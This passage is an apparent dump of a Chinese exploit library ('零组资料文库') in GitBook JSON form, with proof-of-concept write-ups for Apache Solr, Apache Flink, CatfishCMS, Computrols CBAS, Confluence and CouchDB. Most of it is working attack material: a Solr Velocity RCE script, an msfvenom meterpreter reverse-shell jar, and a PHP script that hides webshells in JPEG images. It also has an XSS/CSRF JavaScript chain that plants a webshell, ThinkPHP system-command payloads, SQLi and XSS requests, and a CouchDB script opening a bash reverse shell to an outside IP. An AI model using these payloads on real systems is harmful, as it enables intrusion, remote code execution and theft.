'state': 0 } except: return { 'init': 'Init node config failed', 'state': 0 } def rce(self): url = self.url + (\"/select?q=1&&wt=velocity&v.template=custom&v.template.custom=\" \"%23set($x=%27%27)+\" \"%23set($rt=$x.class.forName(%27java.lang.Runtime%27))+\" \"%23set($chr=$x.class.forName(%27java.lang.Character%27))+\" \"%23set($str=$x.class.forName(%27java.lang.String%27))+\" \"%23set($ex=$rt.getRuntime().exec(%27\" + self.command + \"%27))+$ex.waitFor()+%23set($out=$ex.getInputStream())+\" \"%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end\") try: res = requests.get(url=url, timeout=5) if res.status_code == 200: try: if res.json()['responseHeader']['status'] == '0': return 'RCE failed @Apache Solr node %s\\n' % self.node else: return 'RCE failed @Apache Solr node %s\\n' % self.node except: return 'RCE Successfully @Apache Solr node %s\\n %s\\n' % (self.node, res.text.strip().strip('0')) else: return 'RCE failed @Apache Solr node %s\\n' % self.node except: return 'RCE failed @Apache Solr node %s\\n' % self.node def check(ip, port='8983', command='whoami'): system = initSolr(ip=ip, port=port) if system.get_nodes()['state'] == 0: print('No Nodes Found. Remote Exec Failed!') else: nodes = system.get_nodes()['node'] systeminfo = system.get_system() os_name = systeminfo['system']['name'] os_version = systeminfo['system']['version'] print('OS Realese: %s, OS Version: %s\\nif remote exec failed, ' 'you should change your command with right os platform\\n' % (os_name, os_version)) for node in nodes: res = apacheSolrRCE(ip=ip, port=port, node=node, command=command) init_node_config = res.init_node_config() if init_node_config['state'] == 1: print('Init node %s Successfully, exec command=%s' % (node, command)) result = res.rce() print(result) else: print('Init node %s Failed, Remote Exec Failed\\n' % node) if __name__ == '__main__': usage = ('python3 script.py ip [port [command]]\\n ' '\\t\\tdefault port=8983\\n ' '\\t\\tdefault command=whoami') if len(sys.argv) == 4: ip = sys.argv[1] port = sys.argv[2] command = sys.argv[3] check(ip=ip, port=port, command=command) elif len(sys.argv) == 3: ip = sys.argv[1] port = sys.argv[2] check(ip=ip, port=port) elif len(sys.argv) == 2: ip = sys.argv[1] check(ip=ip) else: print('Usage: %s:\\n' % usage) 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:48 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Apache/Apache Flink Dashboard 未授权访问-远程代码命令执行.html":{"url":"0day/Apache/Apache Flink Dashboard 未授权访问-远程代码命令执行.html","title":"Apache Flink Dashboard 未授权访问-远程代码命令执行","keywords":"","body":"Apache Flink Dashboard 未授权访问-远程代码命令执行 一、漏洞简介 Apache Flink的任意Jar包上传导致远程代码执行的漏洞 二、漏洞影响 三、复现过程 1、 msfvenom -p java/meterpreter/reverse_tcp LHOST=10.10.20.166 LPORT=8989 -f jar > rce.jar 2、 上传alewong Jar包 批量脚本 https://github.com/ianxtianxt/Apache-Flink-Dashboard-rec Ps: 当注释掉 if 'Unable to load requested file' in str(data): 之后，出现Token为空，或者 Unauthorized request 时候是不存在未授权访问的，而是带授权 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-13 12:19:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/2.html":{"url":"0day/CatfishCMS/2.html","title":"CatfishCMS后台csrf","keywords":"","body":"CatfishCMS后台csrf 一、漏洞简介 二、漏洞影响 三、复现过程 首先需要登录后台 history.pushState('', '', '/') 修改前 修改后 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-28 23:21:18 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/1.html":{"url":"0day/CatfishCMS/1.html","title":"CatfishCMS后台储存型xss","keywords":"","body":"CatfishCMS后台储存型xss 一、漏洞简介 网站背景中的管理员可以发布包含存储XSS漏洞的文章 提交标题以抓取数据包 使用burp修改参数 浏览文章可以触发XSS 二、漏洞影响 三、复现过程 neiron= 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-28 23:17:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/6.html":{"url":"0day/CatfishCMS/6.html","title":"CatfishCMS 4.5.7 xss","keywords":"","body":"CatfishCMS 4.5.7 xss 一、漏洞简介 二、漏洞影响 CatfishCMS 4.5 三、复现过程 漏洞分析 文件：application\\config.php 参数：default_filter 最后找到一处未过滤的地方 文件：application/index/controller/Index.php 方法：pinglun() 过滤函数 文件：application\\index\\controller\\Common.php 方法：filterJs() 可以看到只是简单的过滤很简单就可以绕过 复现 自己在此cms注册一个账号然后随便点击一篇文章 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 20:23:23 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/7.html":{"url":"0day/CatfishCMS/7.html","title":"CatfishCMS 4.5.7 csrf getshell","keywords":"","body":"CatfishCMS 4.5.7 csrf getshell 一、漏洞简介 二、漏洞影响 CatfishCMS 4.5 三、复现过程 思路： 前台评论出插入xss代码->诱骗后台管理员访问网站-内容管理-评论管理-自动执行xss代码->通过csrf插入一条新文章->通过csrf清除缓存->在通过js访问前端任意页面生成缓存建立shell 大概的想法就是这样做了。 后台创建文章方法 地址：application\\admin\\controller\\Index.php 方法：write(); 这个方法没有什么可以讲的只是后面的组合漏洞要使用到他 后台清除缓存方法 地址：application\\admin\\controller\\Index.php 方法：clearcache() 这个方法没有什么可以讲的只是后面的组合漏洞要使用到他 例子： 1， 准备好脚本 2，利用前面的xss漏洞，配合这个脚本形成xsrf漏洞 这样我们在前端的事情就完事了。接着我们模拟后台管理员进入后台的操作 模拟的后端管理员操作： 漏洞原理与流程： 1,后台创建文章方法 地址：application\\admin\\controller\\Index.php 方法：write(); 这个方法没有什么可以讲只是单纯的从前端获取数据然后写入数据库罢了 2,后台清除缓存方法 地址：application\\admin\\controller\\Index.php 方法：clearcache() 这个方法没有什么可以讲的。只是单纯的删除缓存数据 3,访问前端重新生成缓存 地址： application\\index\\controller\\Index.php 方法：index() 缓存的名字由来 缓存的名字组成就是比较简单的了。 这上面几幅图就是缓存的名字了什么意思呢？很简单 首先是从index目录里面的index模块下面的index方法 调用了一个方法 $template = $this->receive('index'); = index 然后是ndex目录里面的Common模块里面的receive 方法 获取了变量$source 值 = index 获取了变量$page 值 = 1 Cache::set('hunhe_'.$source.$page,$hunhe,3600); 缓存方法 最后就是 MD5(hunhe_index1) = 9040ab6906a15768edcd9e5b1d57fcda 后记： 使用此方法的话，尝试一下在url中输入 http://www.xxxxxxx.com/runtime http://www.xxxxxxx.com/runtime/cache http://www.xxxxxxx.com/runtime/cache/8d6ab84ca2af9fccd4e4048694176ebf.php 按顺序输入如果前两个访问得到的结果是403 最后的结果不是403或是404 而是返回正常的页面，那么说明站点的缓存目录是可以访问的，这个时候可以使用此漏洞。配合xss+csrf 获取getshell 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 20:30:31 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/3.html":{"url":"0day/CatfishCMS/3.html","title":"CatfishCMS 4.6.15 前台xss","keywords":"","body":"CatfishCMS 4.6.15 前台xss 一、漏洞简介 二、漏洞影响 CatfishCMS 4.6 三、复现过程 代码分析 url： http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/index/Index/pinglun 文件：application/index/controller/Index.php 方法：pinglun( 文件：application\\index\\controller\\Common.php 过滤函数：filterJs() 漏洞复现 首先注册一个用户 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 00:34:57 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/4.html":{"url":"0day/CatfishCMS/4.html","title":"CatfishCMS 4.6.15 后台文件包含getshell","keywords":"","body":"CatfishCMS 4.6.15 后台文件包含getshell 一、漏洞简介 使用TP的模版函数进行文件包含 二、漏洞影响 CatfishCMS 4.6 三、复现过程 漏洞原理 url： http://0-sec.org/cms/CatfishCMS-4.6.12/index.php/admin/Index/newpage.html 文件地址：\\CatfishCMS-4.6.12\\application\\admin\\controller\\Index.php 函数：newpage() 复现 首先需要制作图片马 在正常图片中插入shell并无视GD图像库的处理，常规方法有两种 1. 对比两张经过php-gd库转换过的gif图片，如果其中存在相同之处，这就证明这部分图片数据不会经过转换。然后我可以注入代码到这部分图片文件中，最终实现远程代码执行 2. 利用php-gd算法上的问题进行绕过 这里我们选择第二种，使用脚本进行处理图片并绕过 1. 上传一张jpg图片，然后把网站处理完的图片再下回来 比如x.jpg 2. 执行图片处理脚本脚本进行处理 php jpg_payload.php x.jpg 3. 如果没出错的话，新生成的文件再次经过gd库处理后，仍然能保留webshell代码语句 提示： 1. 图片找的稍微大一点 成功率更高 2. shell语句越短成功率越高 3. 一张图片不行就换一张 不要死磕注：上面的字全部是抄的，先说明一下不然给人按在地上骂就不好了 制作过程： 图片马制作脚本 In case of successful injection you will get a specially crafted image, which should be uploaded again. Since the most straightforward injection method is used, the following problems can occur: 1) After the second processing the injected data may become partially corrupted. 2) The jpg_payload.php script outputs \"Something's wrong\". If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image. Sergey Bobrov @Black2Fan. See also: https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/ */ $a = '$_POST[eeeeeee]'; $miniPayload = \"\"; /*$miniPayload = \"\";*/ if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) { die('php-gd is not installed'); } if(!isset($argv[1])) { die('php jpg_payload.php '); } set_error_handler(\"custom_error_handler\"); for($pad = 0; $pad readShort() != 0xFFD8) { die('Incorrect SOI marker'); } while((!$dis->eof()) && ($dis->readByte() == 0xFF)) { $marker = $dis->readByte(); $size = $dis->readShort() - 2; $dis->skip($size); if($marker === 0xDA) { $startPos = $dis->seek(); $outStreamTmp = substr($outStream, 0, $startPos) . $miniPayload . str_repeat(\"\\0\",$nullbytePayloadSize) . substr($outStream, $startPos); checkImage('_'.$argv[1], $outStreamTmp, TRUE); if($extraBytes !== 0) { while((!$dis->eof())) { if($dis->readByte() === 0xFF) { if($dis->readByte !== 0x00) { break; } } } $stopPos = $dis->seek() - 2; $imageStreamSize = $stopPos - $startPos; $outStream = substr($outStream, 0, $startPos) . $miniPayload . substr( str_repeat(\"\\0\",$nullbytePayloadSize). substr($outStream, $startPos, $imageStreamSize), 0, $nullbytePayloadSize+$imageStreamSize-$extraBytes) . substr($outStream, $stopPos); } elseif($correctImage) { $outStream = $outStreamTmp; } else { break; } if(checkImage('payload_'.$argv[1], $outStream)) { die('Success!'); } else { break; } } } } unlink('payload_'.$argv[1]); die('Something\\'s wrong'); function checkImage($filename, $data, $unlink = FALSE) { global $correctImage; file_put_contents($filename, $data); $correctImage = TRUE; imagecreatefromjpeg($filename); if($unlink) unlink($filename); return $correctImage; } function custom_error_handler($errno, $errstr, $errfile, $errline) { global $extraBytes, $correctImage; $correctImage = FALSE; if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) { if(isset($m[1])) { $extraBytes = (int)$m[1]; } } } class DataInputStream { private $binData; private $order; private $size; public function __construct($filename, $order = false, $fromString = false) { $this->binData = ''; $this->order = $order; if(!$fromString) { if(!file_exists($filename) || !is_file($filename)) die('File not exists ['.$filename.']'); $this->binData = file_get_contents($filename); } else { $this->binData = $filename; } $this->size = strlen($this->binData); } public function seek() { return ($this->size - strlen($this->binData)); } public function skip($skip) { $this->binData = substr($this->binData, $skip); } public function readByte() { if($this->eof()) { die('End Of File'); } $byte = substr($this->binData, 0, 1); $this->binData = substr($this->binData, 1); return ord($byte); } public function readShort() { if(strlen($this->binData) binData, 0, 2); $this->binData = substr($this->binData, 2); if($this->order) { $short = (ord($short[1]) binData||(strlen($this->binData) === 0); } } ?> 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 14:59:45 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/5.html":{"url":"0day/CatfishCMS/5.html","title":"CatfishCMS 4.6.15 csrf getshell","keywords":"","body":"CatfishCMS 4.6.15 csrf getshell 一、漏洞简介 在测试的过程中发现更新版本的时候作者添加一个参数 verification 可能是用来防治csrf。嗯，不得不说，作者安全意识提高了，用来防治csrf这的却是一个好思路，但是对于我们可以执行xss来说，verification 就显的苍白无力了，因为我们可以先获取 verification 然后在执行csrf 从而来绕过。 二、漏洞影响 CatfishCMS 4.6 三、复现过程 漏洞分析 文件：CatfishCMS-4.6.12\\catfish\\library\\think\\Template.php 函数：fetch() 嗯，说完了。Fetch方法最后都会编译文件以后通过PHP输出，所以如果我们可以在他编译之前写入 恶意代码 那么就可以为所欲为。 复现 前台注册一个账户->注册一个图片马到网站中->评论处插入xss代码->等待无辜管理员登录网站->获取 verification(绕过检测)->管理员入口-页面管理-新建页面-csrf插入一条非法语句引起包含漏洞(用来包含前面的图片马)->包含漏洞执行代码->包含漏洞添加getshell_code.php文件写入恶意代码->包含漏洞-将框架文件start.php添加一句话木马-包含数据库配置文件-连接数据库->删除我们前面的评论->删除我们csrf创建的页面->邮件通知我们->getshell CatfishCMS-4.6.12-xss.js /* 需要插入的xss代码 ';$('body').append(xss_js);\"> */ //不用动的 var articles = 'index.php/admin/Index/articles.html';//用来获取 verification 绕过检测 var newpage = 'index.php/admin/Index/newpage.html';//生成文章地址 var allpage = 'index.php/admin/Index/allpage.html';//获取文章链接 //需要改的 var url = 'http://0-sec.org';//你要日的站的域名 var directory = '/cms/CatfishCMS-4.6.12/'; //日的站的额外目录一般为空即可(站点设置二级目录时，此目录要填写) var img_trojan_url = '../../../'+'data/uploads/20171201/2c8b7c7f1d49faeb5321ce0c9b1962af.jpg';//图片马的地址 修改 + 号后面的即可 var getshell_code = 'http://127.0.0.1/cms/CatfishCMS-4.6.12/xss-js/getshell_code.txt';//恶意代码远程包含的地址 $('body').append(''); $('body').append(''); $.ajax({ url: url+directory+articles, dataType: \"json\", success: function(verification_content){ $('#csrf_verification').append(verification_content); var verification = $('#verification').html();//用来绕过验证的 // alert(verification); //csrf生成文章,引起文件包含漏洞 $.ajax({ type: \"POST\", url: url+directory+newpage, data: { 'biaoti':'xss_csrf_getshll', 'template':img_trojan_url, 'verification':verification, 'fabushijian':'2017-12-05 11:56:48' }, success: function(){ //csrf获取shell链接 $.ajax({ type: \"POST\", url: url+directory+allpage, success: function(allpage_content){ $('#csrf_allpage').append(allpage_content); var shell_id = $('#csrf_allpage .table-responsive .table-bordered tbody tr td .gouxuan').eq(0).val(); var shell_url = $('#csrf_allpage .table-responsive .table-bordered tbody tr td a').eq(0).attr('href'); var shell_content = ''; shell_content+= \"$myfile = fopen('getshell_code.php', 'w');\"; shell_content+= '$txt = '+'file_get_contents(\"'+getshell_code+'\");'; shell_content+= 'fwrite($myfile, $txt);'; console.log(shell_content); //执行shell 生成马子 $.ajax({ type: \"POST\", url: url+shell_url, dataType: \"json\", data: {'ddd':shell_content}, success: function(data){ $.ajax({ type: \"GET\", url: url+directory+'getshell_code.php', dataType: \"json\", // data: {'zzz':1} }); }, error: function(){ $.ajax({ type: \"GET\", url: url+directory+'getshell_code.php', dataType: \"json\", // data: {'zzz':1} }); } }); } }); } }); } }); 写好以后模拟管理员，进入后台 getshell_code query($sql); $pdo->query($sql_1); unlink('getshell_code.php'); } ?> 连接马子的操作，这个文件会在index.php中给引入所以直接 http://0-sec.org/index.php POST ddd = 你要执行的命令 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-10 15:26:16 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CatfishCMS/CatfishCMS远程命令执行.html":{"url":"0day/CatfishCMS/CatfishCMS远程命令执行.html","title":"（CNVD-2019-06255）CatfishCMS远程命令执行","keywords":"","body":"（CNVD-2019-06255）CatfishCMS远程命令执行 一、漏洞简介 二、漏洞影响 v4.8.54 三、复现过程 1、_method=__construct CatfishCMS基于thinkPHP5开发。 Request类（catfish/library/think/Request.php）用于处理请求。 它的成员函数method用于获取请求的类型。 application/config.php 中定义了“表单请求类型伪装变量”: POST请求参数 “ _method=construct ”，将 construct 传给了var_method ，在Request类的method函数中执行后，实现了对Request类的 __construct 构造函数的调用；并且将完整的POST参数传给了构造函数。 2、method=*&filter[]=system catfish/library/think/Request.php模块中的Request类的构造函数： 中存在的参数，就取用户传入的值为其赋值。 _method=construct 使得 method 函数调用了 construct 构造函数， 并且将完整的POST参数传递过去。实现了对本类中的 $method 和 $filter 两个全局变量的覆盖。 filter[]=system 的补充说明： filter[]=system 或者 filter=system都可以，[]符号可有可无；system意为执行系统命令。 Method=* 的补充说明： method参数的取值限定为：catfish/library/think/Route.php 模块中定义的路由规则。如：GET、POST、PUT、* 等任何一个值都可以；如果值不在此表或为空，都会报错。 3、s=dir application/config.php 中定义PATHINFO变量名为’ s ’。可用s传入需要执行的命令，如s=dir 最终的的payload： s=dir&_method=__construct&method=*&filter[]=system _method=construct 使得 Request类的method函数调用 construct 构造函数，并且将完整的payload传递给构造函数；构造函数中对 method 和filter 两个全局变量进行覆盖，method=&filter[]=system ；参数s=dir传入需要执行的系统命令 dir 。 s=echo \"shell\" >shell.php&filter[]=system&method=*&_method=__construct 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-29 15:45:14 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Computrols CBAS Web/1.html":{"url":"0day/Computrols CBAS Web/1.html","title":"（CVE-2019-10846）Computrols CBAS Web反射型xss","keywords":"","body":"（CVE-2019-10846）Computrols CBAS Web反射型xss 一、漏洞简介 Computrols CBAS Web是美国Computrols公司的一套楼宇自动化系统 二、漏洞影响 Computrols CBAS Web 三、复现过程 1、 POST /cbas/index.php?m=auth&a=verifyid HTTP/1.1 username=\">confirm(document.cookie)&submit_button=Send+Me+a+New+Password+Via+Email 2、 POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=\">htmlinjection&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62 3、 GET /cbas/index.php?m=auth&a=login&username=\">my milkshake brings all the boys to the yard.&password=damn_right HTTP/1.1 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-14 00:40:59 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Computrols CBAS Web/3.html":{"url":"0day/Computrols CBAS Web/3.html","title":"（CVE-2019-10848）Computrols CBAS Web 用户名枚举","keywords":"","body":"（CVE-2019-10848）Computrols CBAS Web 用户名枚举 一、漏洞简介 二、漏洞影响 19.0.0及以下 三、复现过程 测试无效用户： POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=randomuser&password=&challenge=60753c1b5e449de80e21472b5911594d&response=e16371917371b8b70529737813840c62 Response randomuser 测试有效用户： POST /cbas/index.php?m=auth&a=login HTTP/1.1 username=admin&password=&challenge=6e4344e7ac62520dba82d7f20ccbd422&response=e09aab669572a8e4576206d5c14befc5s Response Invalid username/password combination. Please try again! 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-14 00:51:17 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Computrols CBAS Web/2.html":{"url":"0day/Computrols CBAS Web/2.html","title":"（CVE-2019-10852）Computrols CBAS Web SQL注入","keywords":"","body":"（CVE-2019-10852）Computrols CBAS Web SQL注入 一、漏洞简介 Computrols CBAS-Web经过身份验证的基于布尔的盲SQL注入 二、漏洞影响 19.0.0及以下 三、复现过程 http://www.0-sec.org/cbas/index.php?m=servers&a=start_pulling&id=1 AND 2510 = 2510 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-14 00:47:58 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Confluence/1.html":{"url":"0day/Confluence/1.html","title":"（CVE-2019-3396）未授权RCE漏洞","keywords":"","body":"（CVE-2019-3396）未授权RCE漏洞 一、漏洞简介 （CVE-2019-3396）未授权RCE漏洞 二、影响范围 6.6.12之前所有6.6.x版本 6.12.3之前所有6.12.x版 6.13.13之前所有6.13.x版本 6.14.2之前所有6.14.x版本 三、复现过程 1.开启一个FTP服务,根目录放置模板文件 r.vm #set ($exp=\"exp\") #set ($a=$exp.getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).in voke(null,null).exec($command)) #set ($input=$exp.getClass().forName(\"java.lang.Process\").getMethod(\"getInputStream\") .invoke($a)) #set($sc = $exp.getClass().forName(\"java.util.Scanner\")) #set($constructor = $sc.getDeclaredConstructor($exp.getClass().forName(\"java.io.InputStream\"))) #set($scan=$constructor.newInstance($input).useDelimiter(\"\\\\A\")) #if($scan.hasNext()) $scan.next() #end 这里用 python 开启一个 FTP 服务进行演示: pip install pyftpdlib python -m pyftpdlib -p 8883 回显命令执行: POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 Content-Length: 193 Accept: text/plain, */*; q=0.01 Origin: http://localhost:8090 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Content-Type: application/json; charset=UTF-8 Referer: http://localhost:8090/ Connection: close {\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"params\": {\"url\":\"https://www.viddler.com/v/test\",\"width\":\"1000\",\"height\":\"1000\",\"_templat e\":\"ftp://127.0.0.1:8883/r.vm\",\"command\":\"whoami\"},\"body\":\"\"}} 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/Confluence/2.html":{"url":"0day/Confluence/2.html","title":"（CVE-2019-3394）Confluence 文件读取漏洞","keywords":"","body":"（CVE-2019-3394）Confluence 文件读取漏洞 一、漏洞简介 （CVE-2019-3394）Confluence 文件读取漏洞 二、影响范围 6.1.0 6.7.0 6.14.0 三、复现过程 poc POST /rest/tinymce/1/macro/preview HTTP/1.1 Host: localhost:8090 Content-Length: 175 Accept: text/plain, */*; q=0.01 Origin: http://localhost:8090 X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36 Content-Type: application/json; charset=UTF-8 Referer: http://localhost:8090/ Connection: close {\"contentId\":\"1\",\"macro\":{\"name\":\"widget\",\"params\": {\"url\":\"https://www.viddler.com/v/test\",\"width\":\"1000\",\"height\":\"1000\",\"_templat e\":\"file:///C:/Windows/win.ini\"},\"body\":\"\"}} 触发条件 一个有效的登录账号 该账号具有在空间「添加页面」的权限 复现步骤 1.创建一个空白页 2.插入一张网络图片 插入url改为你需要查看的文件，例如 /packages/../web.xml 3.点击发布，抓取报文 4.删除多余url前缀,只留下 /packages/../web.xml 并放开报文 5.查看页面源码确认修改成功 6.导出word，并抓包查看 路径说明 由于 catalina.jar中的 org.apache.catalina.webresources.StandardRoot.class的 getResource方法的 validate存在过滤和限制，所以可遍历路径均在 /WEB-INF下 可读取的文件大致如下 #WEB-INF下 decorators.xml glue-config.xml server-config.wsdd sitemesh.xml urlrewrite.xml web.xml #/WEB-INF/classes下 confluence-filtered-frames.properties confluence-init.properties crowd.properties(较为重要) hash-registry.properties lgplTemplate.soy log4j-diagnostic.properties log4j.properties logging.properties mime.types osuser.xml seraph-config.xml seraph-paths.xml velocity_implicit.vm velocity.properties 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-11-04 00:39:10 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/CouchDB/1.html":{"url":"0day/CouchDB/1.html","title":"CouchDB未授权访问","keywords":"","body":"CouchDB未授权访问 一、漏洞简介 CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation (JSON) API 访问。CouchDB会默认会在5984端口开放Restful的API接口，用于数据库的管理功能。 CouchDB允许用户指定一个二进制程序或者脚本，与CouchDB进行数据交互和处理，query_server在配置文件local.ini中的格式： [query_servers] LANGUAGE = PATH ARGS 默认情况下，配置文件中已经设置了两个query_servers: [query_servers] javascript = /usr/bin/couchjs /usr/share/couchdb/server/main.js coffeescript = /usr/bin/couchjs /usr/share/couchdb/server/main-coffee.js 可以看到，CouchDB在query_server中引入了外部的二进制程序来执行命令，如果我们可以更改这个配置，那么就可以利用数据库来执行命令了 在2017年11月15日，CVE-2017-12635和CVE-2017-12636披露，CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。 http://bobao.360.cn/learning/detail/4716.htmlhttps://justi.cz/security/2017/11/14/couchdb-rce-npm.html 二、影响范围 小于 1.7.0 以及 小于 2.1.1 该漏洞是需要登录用户方可触发，如果不知道目标管理员密码，可以利用CVE-2017-12635先增加一个管理员用户。 三、复现过程 1.扫描探测 nmap -p 5984 --script \"couchdb-stats.nse\" 127.0.0.1 2.两个版本的利用方式 (1) 1.6.0 下的说明 依次执行如下请求即可触发任意命令执行,其中,vulhub:vulhub为管理员账号密码。 curl -X PUT 'http://vulhub:vulhub@your-ip:5984/_config/query_servers/cmd' -d '\"id >/tmp/success\"' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' curl -X POST 'http://vulhub:vulhub@your-ip:5984/vultest/_temp_view?limit=10' -d '{\"language\":\"cmd\",\"map\":\"\"}' -H 'Content-Type:application/json' 第一个请求是添加一个名字为cmd的query_servers，其值为 id >/tmp/success，这就是我们后面待执行的命令。 第二、三个请求是添加一个Database和Document，这里添加了后面才能查询。 第四个请求就是在这个Database里进行查询，因为我将language设置为cmd，这里就会用到我第一步里添加的名为cmd的query_servers，最后触发命令执行。 (2) 2.1.0 下的说明 2.1.0中修改了我上面用到的两个API，这里需要详细说明一下。 Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name。这个其实也简单，我们带上账号密码访问/_membership即可： curl http://vulhub:vulhub@your-ip:5984/_membership 可见，我们这里只有一个node，名字是nonode@nohost。 然后，我们修改nonode@nohost的配置： curl -X PUT http://vulhub:vulhub@your-ip:5984/_node/nonode@nohost/_config/query_servers/cmd -d '\"id >/tmp/success\"' 然后，与1.6.0的利用方式相同，我们先增加一个Database和一个Document： curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest' curl -X PUT 'http://vulhub:vulhub@your-ip:5984/vultest/vul' -d '{\"_id\":\"770895a97726d5ca6d70a22173005c7b\"}' Couchdb 2.x删除了_temp_view，所以我们为了触发query_servers中定义的命令，需要添加一个_view： curl -X PUT http://vulhub:vulhub@your-ip:5984/vultest/_design/vul -d '{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}' -H \"Content-Type: application/json\" 增加_view的同时即触发了query_servers中的命令。 2.1 p牛的python脚本 支持高低版本 需要在version = 定义 ##!/usr/bin/env python3 import requests from requests.auth import HTTPBasicAuth target = 'http://127.0.0.1:5984' command = '\"bash -i >& /dev/tcp/192.168.2.64/2222 0>&1\"' version = 2 session = requests.session() session.headers = { 'Content-Type': 'application/json' } ## session.proxies = { ## 'http': 'http://127.0.0.1:8085' ## } session.put(target + '/_users/org.couchdb.user:wooyun', data='''{ \"type\": \"user\", \"name\": \"wooyun\", \"roles\": [\"_admin\"], \"roles\": [], \"password\": \"wooyun\" }''') session.auth = HTTPBasicAuth('wooyun', 'wooyun') if version == 1: session.put(target + ('/_config/query_servers/cmd'), data=command) else: host = session.get(target + '/_membership').json()['all_nodes'][0] session.put(target + '/_node/{}/_config/query_servers/cmd'.format(host), data=command) session.put(target + '/wooyun') session.put(target + '/wooyun/test', data='{\"_id\": \"wooyuntest\"}') if version == 1: session.post(target + '/wooyun/_temp_view?limit=10', data='{\"language\":\"cmd\",\"map\":\"\"}') else: session.put(target + '/wooyun/_design/test', data='{\"_id\":\"_design/test\",\"views\":{\"wooyun\":{\"map\":\"\"} },\"language\":\"cmd\"}') 2.2 bash自动化脚本 ##!/bin/bash echo CouchDB getshell - c0debreak - tools.changesec.com echo if [[ $## -ne 2 ]];then echo Usage: $0 http://xx.xx.xx.xx:5984 myserver:myport exit 1 else server=$1 cb=${2/:/\\/} fi function run() { cmd=$1 curl -XPUT \"$server/_config/query_servers/cmd\" -d \"\\\"$cmd\\\"\" curl -XPUT \"$server/example\" curl -XPUT \"$server/example/record\" -d 